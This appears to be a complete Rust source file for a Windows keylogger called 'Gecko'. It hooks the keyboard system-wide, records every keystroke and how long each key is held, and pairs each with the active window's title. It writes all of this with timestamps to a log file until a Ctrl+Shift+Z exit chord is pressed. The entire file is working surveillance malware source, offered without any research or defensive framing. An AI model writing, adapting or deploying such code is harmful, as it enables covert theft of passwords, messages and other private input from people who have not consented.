use std::{collections::HashMap, sync::{Arc, Mutex}, time::{Duration, Instant}, thread, sync::mpsc, fs::File, io::Write};
use willhook::{keyboard_hook, InputEvent, KeyboardKey};
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
use winapi::um::winuser::GetAsyncKeyState;

pub fn activate_keylogger(file: Arc<Mutex<File>>) {
    let (sender, receiver) = mpsc::channel();
    let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
    let held_keys_clone = Arc::clone(&held_keys);
    let h = keyboard_hook().unwrap();

    println!("Gecko activating....");
    let mut file_guard = file.lock().unwrap();
    writeln!(file_guard, "Gecko activated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
    drop(file_guard);
    let fileex = Arc::clone(&file);
    // Keyboard Event Handling thread
    let keyboard_handle = thread::spawn(move || {
        keyboard_event_handler(h, held_keys_clone, receiver, fileex);
    });

    loop {
        if exit_condition() {
            println!("Gecko deactivating....");
            let mut file_guard = file.lock().unwrap();
            writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
            drop(file_guard);
            if let Err(err) = sender.send(()) {
                eprintln!("Failed to send termination signal: {}", err);
            }
            break;
        }

        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
    }

    keyboard_handle.join().unwrap();
}
fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>, file: Arc<Mutex<File>>) {
    let mut last_title = String::new();
    loop {
        if let Ok(ie) = h.try_recv() {
            match ie {
                InputEvent::Keyboard(ke) => {
                    if let Some(key) = ke.key {
                        handle_key_event(key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title, &file);
                    }
                }
                _ => {
                    let mut file_guard = file.lock().unwrap();
                    writeln!(&mut *file_guard, "Unknown Input event: {:?}", ie).unwrap();
                },
            }
        }

        if receiver.try_recv().is_ok() {
            break;
        }

        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
    }
}

fn handle_key_event(
    key: KeyboardKey,
    pressed: willhook::KeyPress,
    held_keys: &mut HashMap<KeyboardKey, Instant>,
    last_title: &mut String,
    file: &Arc<Mutex<File>>,
) {
    let title = active_window();
    match pressed {
        willhook::KeyPress::Down(_) => {
            if !held_keys.contains_key(&key) {
                held_keys.insert(key, Instant::now());
            }
        }
        willhook::KeyPress::Up(_) => {
            if let Some(inittime) = held_keys.remove(&key) {
                let elapsed = Instant::now().duration_since(inittime);
                if elapsed.as_millis() < 400 {
                    log_key(&file, &last_title, key, None);
                } else {
                    log_key(&file, &last_title, key, Some(elapsed));
                }
            }
        }
        _ => {}
    }
    *last_title = title;
}

fn log_key(file: &Arc<Mutex<File>>, title: &str, key: KeyboardKey, elapsed: Option<Duration>) {
    let local_now = chrono::Local::now();
    let local_time_string = local_now.format("%Y-%m-%d %H:%M:%S").to_string();
    let mut file_guard = file.lock().unwrap();
    match elapsed {
        Some(hd) => writeln!(&mut *file_guard, "{} : {} : {:?} : Pressed and held for: {:?}", local_time_string, title, key, hd).unwrap(),
        None => writeln!(&mut *file_guard, "{} : {} : {:?}", local_time_string, title, key).unwrap(),
    };
}

fn active_window() -> String {
    unsafe {
        let active_window = GetForegroundWindow();
        let mut buffer: Vec<u16> = vec![0; 256]; // Allocate a buffer of fixed size
        let len = GetWindowTextLengthW(active_window);
        if len > 0 {
            GetWindowTextW(active_window, buffer.as_mut_ptr(), 256);
            // Convert wide characters to string
            String::from_utf16_lossy(&buffer[..len as usize])
        } else {
            String::new()
        }
    }
}

fn exit_condition() -> bool {
    unsafe {
        GetAsyncKeyState(VK_CONTROL) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(0x5A) & 0x8000u16 as i16 != 0
    }
}
